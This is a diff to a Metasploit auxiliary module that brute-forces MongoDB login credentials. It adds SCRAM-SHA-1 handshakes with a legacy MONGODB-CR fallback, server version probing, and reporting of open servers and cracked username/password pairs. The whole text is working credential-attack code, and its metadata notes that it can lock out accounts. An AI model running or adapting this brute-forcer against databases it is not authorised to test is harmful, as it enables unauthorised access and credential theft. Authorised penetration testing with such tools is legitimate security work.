@@ -3,11 +3,15 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'bson'
+require 'openssl'
+require 'digest'
+
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::Mongodb
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(
@@ -16,18 +20,22 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'MongoDB Login Utility',
         'Description' => %q{
           This module attempts to brute force authentication credentials for MongoDB.
-          Note that, by default, MongoDB does not require authentication.
+          It supports both SCRAM-SHA-1 (MongoDB 3.0+) and falls back to legacy
+          MONGODB-CR authentication if SCRAM is unsupported by the target server.
         },
         'References' => [
           [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
           [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ]
         ],
-        'Author' => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
+        'Author' => [
+          'Gregory Man <man.gregory[at]gmail.com>',
+          'h00die' # SCRAM and updating compatibility for MongoDB 3.0+ and later
+        ],
         'License' => MSF_LICENSE,
         'Notes' => {
           'Reliability' => UNKNOWN_RELIABILITY,
-          'Stability' => UNKNOWN_STABILITY,
-          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS]
         }
       )
     )
@@ -35,106 +43,208 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(27017),
-        OptString.new('DB', [ true, "Database to use", "admin"])
+        OptString.new('DB', [ true, 'Database to use', 'admin'])
       ]
     )
   end
 
   def run_host(ip)
-    print_status("Scanning IP: #{ip.to_s}")
+    print_status("Scanning IP: #{ip}")
     begin
       connect
+
+      version = get_version
+      ver_info = version ? " (version #{version})" : ''
+
       if require_auth?
-        each_user_pass { |user, pass|
+        print_status("#{peer} - Mongo server#{ver_info} requires authentication")
+        each_user_pass do |user, pass|
           do_login(user, pass)
-        }
+        end
       else
         report_vuln(
-          :host => rhost,
-          :port => rport,
-          :name => "MongoDB No Authentication",
-          :refs => self.references,
-          :exploited_at => Time.now.utc,
-          :info => "Mongo server has no authentication."
+          host: rhost,
+          port: rport,
+          name: 'MongoDB No Authentication',
+          refs: references,
+          exploited_at: Time.now.utc,
+          info: "Mongo server has no authentication.#{ver_info}"
         )
-        print_good("Mongo server #{ip.to_s} doesn't use authentication")
+        print_good("Mongo server #{ip}#{ver_info} doesn't use authentication")
       end
       disconnect
-    rescue ::Exception => e
-      print_error "Unable to connect: #{e.to_s}"
+    rescue StandardError => e
+      print_error "Unable to connect: #{e}"
       return
     end
   end
 
+  def get_version
+    cmd = BSON::Document.new({ 'buildInfo' => BSON::Int32.new(1) })
+    pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)
+
+    sock.put(pkt)
+    resp = sock.get_once(-1, 5)
+
+    doc = mongodb_parse_doc(resp)
+    return nil unless doc && doc['version']
+
+    version_str = doc['version']
+    report_service(
+      host: rhost,
+      port: rport,
+      name: 'mongodb',
+      proto: 'tcp',
+      info: "MongoDB #{version_str}"
+    )
+    version_str
+  rescue StandardError => e
+    vprint_error("#{peer} - Failed to parse version from buildInfo: #{e.message}")
+    nil
+  end
+
   def require_auth?
-    request_id = Rex::Text.rand_text(4)
-    packet = "\x3f\x00\x00\x00" # messageLength (63)
-    packet << request_id           # requestID
-    packet << "\xff\xff\xff\xff"   # responseTo
-    packet << "\xd4\x07\x00\x00" # opCode (2004 OP_QUERY)
-    packet << "\x00\x00\x00\x00" # flags
-    packet << "\x61\x64\x6d\x69\x6e\x2e\x24\x63\x6d\x64\x00" # fullCollectionName (admin.$cmd)
-    packet << "\x00\x00\x00\x00"   # numberToSkip (0)
-    packet << "\x01\x00\x00\x00"   # numberToReturn (1)
-    # query ({"listDatabases"=>1})
-    packet << "\x18\x00\x00\x00\x10\x6c\x69\x73\x74\x44\x61\x74\x61\x62\x61\x73\x65\x73\x00\x01\x00\x00\x00\x00"
+    cmd = BSON::Document.new({ 'listDatabases' => BSON::Int32.new(1) })
+    list_db_pkt = mongodb_build_packet('admin.$cmd', cmd.to_bson.to_s)
 
-    sock.put(packet)
-    response = sock.recv(1024)
+    sock.put(list_db_pkt)
+    auth_resp = sock.get_once(-1, 5)
 
-    have_auth_error?(response)
+    mongodb_have_auth_error?(auth_resp)
   end
 
   def do_login(user, password)
     vprint_status("Trying user: #{user}, password: #{password}")
+
+    # 1. Try SCRAM-SHA-1 first (MongoDB 3.0+)
+    scram_status = auth_scram_sha1(user, password)
+    return scram_status if scram_status == :next_user
+
+    # 2. Fallback to MONGODB-CR if SCRAM failed or is unsupported
+    vprint_status("#{peer} - SCRAM-SHA-1 not accepted or failed; trying MONGODB-CR fallback...")
     nonce = get_nonce
-    status = auth(user, password, nonce)
-    return status
+    if nonce.present?
+      cr_status = auth_cr(user, password, nonce)
+      return cr_status if cr_status == :next_user
+    end
+
+    nil
   end
 
-  def auth(user, password, nonce)
-    request_id = Rex::Text.rand_text(4)
-    packet = request_id # requestID
-    packet << "\xff\xff\xff\xff" # responseTo
-    packet << "\xd4\x07\x00\x00" # opCode (2004 OP_QUERY)
-    packet << "\x00\x00\x00\x00" # flags
-    packet << datastore['DB'] + ".$cmd" + "\x00" # fullCollectionName (DB.$cmd)
-    packet << "\x00\x00\x00\x00"   # numberToSkip (0)
-    packet << "\xff\xff\xff\xff"   # numberToReturn (1)
+  # SCRAM-SHA-1 Handshake (MongoDB 3.0+)
+  def auth_scram_sha1(user, password)
+    db = datastore['DB']
+    digest_pass = Digest::MD5.hexdigest("#{user}:mongo:#{password}")
 
-    # {"authenticate"=>1.0, "user"=>"root", "nonce"=>"94e963f5b7c35146", "key"=>"61829b88ee2f8b95ce789214d1d4f175"}
-    document = "\x01\x61\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x65"
-    document << "\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x02\x75\x73\x65\x72\x00"
-    document << [user.length + 1].pack("L") # +1 due null byte termination
-    document << user + "\x00"
-    document << "\x02\x6e\x6f\x6e\x63\x65\x00\x11\x00\x00\x00"
-    document << nonce + "\x00"
-    document << "\x02\x6b\x65\x79\x00\x21\x00\x00\x00"
-    document << Rex::Text.md5(nonce + user + Rex::Text.md5(user + ":mongo:" + password)) + "\x00"
-    document << "\x00"
-    # Calculate document length
-    document.insert(0, [document.length + 4].pack("L"))
+    client_nonce = Rex::Text.rand_text_alphanumeric(24)
+    auth_payload = "n=#{user},r=#{client_nonce}"
+    client_first_bare = auth_payload
+    client_first_message = "n,,#{auth_payload}"
 
-    packet += document
+    sasl_start_cmd = BSON::Document.new({
+      'saslStart' => BSON::Int32.new(1),
+      'mechanism' => 'SCRAM-SHA-1',
+      'payload' => BSON::Binary.new(client_first_message)
+    })
 
-    # Calculate messageLength
-    packet.insert(0, [(packet.length + 4)].pack("L")) # messageLength
-    sock.put(packet)
-    response = sock.recv(1024)
-    unless have_auth_error?(response)
-      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}'")
+    pkt = mongodb_build_packet("#{db}.$cmd", sasl_start_cmd.to_bson.to_s)
+    sock.put(pkt)
+    resp = sock.get_once(-1, 5)
+
+    reply = mongodb_parse_doc(resp)
+    return nil unless reply && reply['ok'].to_i == 1
+
+    conversation_id = reply['conversationId']
+    server_payload = reply['payload'].data
+    server_vars = mongodb_parse_scram_payload(server_payload)
+
+    server_nonce = server_vars['r']
+    salt = Rex::Text.decode_base64(server_vars['s'])
+    iterations = server_vars['i'].to_i
+
+    salted_password = OpenSSL::PKCS5.pbkdf2_hmac(
+      digest_pass,
+      salt,
+      iterations,
+      20,
+      OpenSSL::Digest.new('SHA1')
+    )
+
+    client_key = OpenSSL::HMAC.digest('sha1', salted_password, 'Client Key')
+    stored_key = OpenSSL::Digest::SHA1.digest(client_key)
+    client_final_without_proof = "c=biws,r=#{server_nonce}"
+    auth_message = "#{client_first_bare},#{server_payload},#{client_final_without_proof}"
+
+    client_signature = OpenSSL::HMAC.digest('sha1', stored_key, auth_message)
+    client_proof = Rex::Text.xor(client_key, client_signature)
+    client_final_message = "#{client_final_without_proof},p=#{Rex::Text.encode_base64(client_proof)}"
+
+    conv_id_bson = conversation_id.is_a?(Integer) ? BSON::Int32.new(conversation_id) : conversation_id
+
+    sasl_continue_cmd = BSON::Document.new({
+      'saslContinue' => BSON::Int32.new(1),
+      'conversationId' => conv_id_bson,
+      'payload' => BSON::Binary.new(client_final_message)
+    })
+
+    pkt = mongodb_build_packet("#{db}.$cmd", sasl_continue_cmd.to_bson.to_s)
+    sock.put(pkt)
+    resp = sock.get_once(-1, 5)
+
+    reply = mongodb_parse_doc(resp)
+    if reply && reply['ok'].to_i == 1
+      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (SCRAM-SHA-1)")
       report_cred(
         ip: rhost,
         port: rport,
         service_name: 'mongodb',
         user: user,
         password: password,
-        proof: response.inspect
+        proof: reply.inspect
       )
       return :next_user
     end
 
-    return
+    nil
+  rescue StandardError => e
+    vprint_error("#{peer} - SCRAM-SHA-1 exception: #{e.message}")
+    nil
+  end
+
+  # Legacy MONGODB-CR Handshake (MongoDB < 3.0)
+  def auth_cr(user, password, nonce)
+    db = datastore['DB']
+    key = Rex::Text.md5(nonce + user + Rex::Text.md5("#{user}:mongo:#{password}"))
+
+    cmd = BSON::Document.new({
+      'authenticate' => BSON::Int32.new(1),
+      'user' => user,
+      'nonce' => nonce,
+      'key' => key
+    })
+
+    packet = mongodb_build_packet("#{db}.$cmd", cmd.to_bson.to_s)
+    sock.put(packet)
+    response = sock.get_once(-1, 5)
+
+    reply = mongodb_parse_doc(response)
+    if reply && reply['ok'].to_i == 1
+      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{password}' (MONGODB-CR)")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: 'mongodb',
+        user: user,
+        password: password,
+        proof: reply.inspect
+      )
+      return :next_user
+    end
+
+    nil
+  rescue StandardError => e
+    vprint_error("#{peer} - MONGODB-CR exception: #{e.message}")
+    nil
   end
 
   def report_cred(opts)
@@ -165,34 +275,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_nonce
-    request_id = Rex::Text.rand_text(4)
-    packet = "\x3d\x00\x00\x00" # messageLength (61)
-    packet << request_id           # requestID
-    packet << "\xff\xff\xff\xff"   # responseTo
-    packet << "\xd4\x07\x00\x00" # opCode (2004 OP_QUERY)
-    packet << "\x00\x00\x00\x00" # flags
-    packet << "\x74\x65\x73\x74\x2e\x24\x63\x6d\x64\x00" # fullCollectionName (test.$cmd)
-    packet << "\x00\x00\x00\x00"   # numberToSkip (0)
-    packet << "\x01\x00\x00\x00"   # numberToReturn (1)
-    # query {"getnonce"=>1.0}
-    packet << "\x17\x00\x00\x00\x01\x67\x65\x74\x6e\x6f\x6e\x63\x65\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\x00"
+    cmd = BSON::Document.new({ 'getnonce' => BSON::Int32.new(1) })
+    pkt = mongodb_build_packet("#{datastore['DB']}.$cmd", cmd.to_bson.to_s)
 
-    sock.put(packet)
-    response = sock.recv(1024)
-    documents = response[36..1024]
-    # {"nonce"=>"f785bb0ea5edb3ff", "ok"=>1.0}
-    nonce = documents[15..30]
-  end
+    sock.put(pkt)
+    response = sock.get_once(-1, 5)
 
-  def have_auth_error?(response)
-    # Response header 36 bytes long
-    documents = response[36..1024]
-    # {"errmsg"=>"auth fails", "ok"=>0.0}
-    # {"errmsg"=>"need to login", "ok"=>0.0}
-    if documents.include?('errmsg')
-      return true
-    else
-      return false
-    end
+    doc = mongodb_parse_doc(response)
+    doc && doc['ok'].to_i == 1 ? doc['nonce'].to_s : ''
   end
 end
